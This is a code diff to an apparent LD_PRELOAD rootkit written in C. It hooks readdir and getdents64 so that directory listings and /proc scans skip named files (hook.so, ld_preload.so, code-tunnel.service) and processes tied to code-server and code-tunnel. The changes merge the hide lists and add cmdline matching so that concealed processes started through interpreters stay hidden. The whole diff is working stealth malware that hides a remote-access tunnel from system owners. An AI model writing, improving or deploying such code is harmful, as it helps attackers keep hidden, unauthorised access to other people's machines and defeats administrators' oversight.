@@ -19,8 +19,27 @@ struct linux_dirent64 {
     char               d_name[];
 };
 
-static const char *HIDE_FILES[] = {"vscode", ".vscode", "hook.so", "vscode.so", "pid.txt", "code-tunnel.service", "ld_preload.so"};
-static const char *HIDE_PROCS[] = {"code-server", "vscode", "code-tunnel", "node", "code"};
+static const char *HIDE_LIST[] = {
+    "vscode", ".vscode", "hook.so", "vscode.so", "pid.txt", 
+    "code-tunnel.service", "ld_preload.so", "code-server", 
+    "vscode-server", "code-tunnel", "node", "code"
+};
+
+static int should_hide(const char *name) {
+    if (!name) return 0;
+    
+    // Exact matches
+    for (size_t i = 0; i < sizeof(HIDE_LIST)/sizeof(HIDE_LIST[0]); i++) {
+        if (strcmp(name, HIDE_LIST[i]) == 0) return 1;
+    }
+    
+    // Substring matches for our specific directories/tools
+    // but NOT for generic things like "node" (to avoid breaking python/npm)
+    if (strstr(name, "code-tunnel") != NULL) return 1;
+    if (strstr(name, "vscode-server") != NULL) return 1;
+    
+    return 0;
+}
 
 static int is_proc_dir(int fd) {
     if (fd < 0) return 0;
@@ -30,19 +49,7 @@ static int is_proc_dir(int fd) {
     ssize_t len = readlink(path, link, sizeof(link)-1);
     if (len != -1) {
         link[len] = '\0';
-        return (strcmp(link, "/proc") == 0);
-    }
-    return 0;
-}
-
-static int should_hide(const char *name, const char **list, size_t count) {
-    if (!name) return 0;
-    for (size_t i = 0; i < count; i++) {
-        // Use exact match for specific files to avoid false positives
-        if (strcmp(name, list[i]) == 0) return 1;
-        // Keep strstr only for things that really need it, but carefully
-        // For example, if we want to hide "code-server" but also "code-server-v1"
-        // But for "node", it's too risky. Let's stick to exact for now to be safe.
+        return (strcmp(link, "/proc") == 0 || strcmp(link, "/proc/") == 0);
     }
     return 0;
 }
@@ -59,22 +66,41 @@ static int is_numeric(const char *s) {
 static int check_process_name(const char *pid_str) {
     if (!is_numeric(pid_str)) return 0;
 
-    char comm_path[64];
-    snprintf(comm_path, sizeof(comm_path), "/proc/%s/comm", pid_str);
+    char path[64];
+    int fd;
     
-    int fd = open(comm_path, O_RDONLY);
-    if (fd == -1) return 0;
-    
-    char proc_name[64];
-    ssize_t n = read(fd, proc_name, sizeof(proc_name)-1);
-    close(fd);
-    
-    if (n > 0) {
-        proc_name[n] = '\0';
-        char *nl = strchr(proc_name, '\n');
-        if (nl) *nl = '\0';
-        return should_hide(proc_name, HIDE_PROCS, sizeof(HIDE_PROCS)/sizeof(HIDE_PROCS[0]));
+    // 1. Check comm (fast path)
+    snprintf(path, sizeof(path), "/proc/%s/comm", pid_str);
+    fd = open(path, O_RDONLY);
+    if (fd != -1) {
+        char proc_name[64];
+        ssize_t n = read(fd, proc_name, sizeof(proc_name)-1);
+        close(fd);
+        if (n > 0) {
+            proc_name[n] = '\0';
+            char *nl = strchr(proc_name, '\n');
+            if (nl) *nl = '\0';
+            if (should_hide(proc_name)) return 1;
+        }
     }
+
+    // 2. Check cmdline (to catch scripts run via sh/node/python)
+    snprintf(path, sizeof(path), "/proc/%s/cmdline", pid_str);
+    fd = open(path, O_RDONLY);
+    if (fd != -1) {
+        char cmdline[256];
+        ssize_t n = read(fd, cmdline, sizeof(cmdline)-1);
+        close(fd);
+        if (n > 0) {
+            // cmdline contains null-terminated strings. We check the whole buffer.
+            // Using a loop to handle null bytes if needed, but strstr on the buffer works 
+            // for the first few arguments which is usually enough.
+            if (strstr(cmdline, "vscode-server") != NULL) return 1;
+            if (strstr(cmdline, "code-server") != NULL) return 1;
+            if (strstr(cmdline, "code-tunnel") != NULL) return 1;
+        }
+    }
+    
     return 0;
 }
 
@@ -91,7 +117,7 @@ struct dirent *readdir(DIR *dir) {
     int is_proc = is_proc_dir(fd);
 
     while ((entry = real_readdir(dir)) != NULL) {
-        if (should_hide(entry->d_name, HIDE_FILES, sizeof(HIDE_FILES)/sizeof(HIDE_FILES[0]))) continue;
+        if (should_hide(entry->d_name)) continue;
         if (is_proc && entry->d_type == DT_DIR && check_process_name(entry->d_name)) continue;
         return entry;
     }
@@ -116,7 +142,7 @@ ssize_t getdents64(int fd, void *dirp, size_t count) {
         struct linux_dirent64 *d = (struct linux_dirent64 *)((char *)dirp + bpos);
         int hide = 0;
 
-        if (should_hide(d->d_name, HIDE_FILES, sizeof(HIDE_FILES)/sizeof(HIDE_FILES[0]))) {
+        if (should_hide(d->d_name)) {
             hide = 1;
         } else if (is_proc && d->d_type == DT_DIR && check_process_name(d->d_name)) {
             hide = 1;
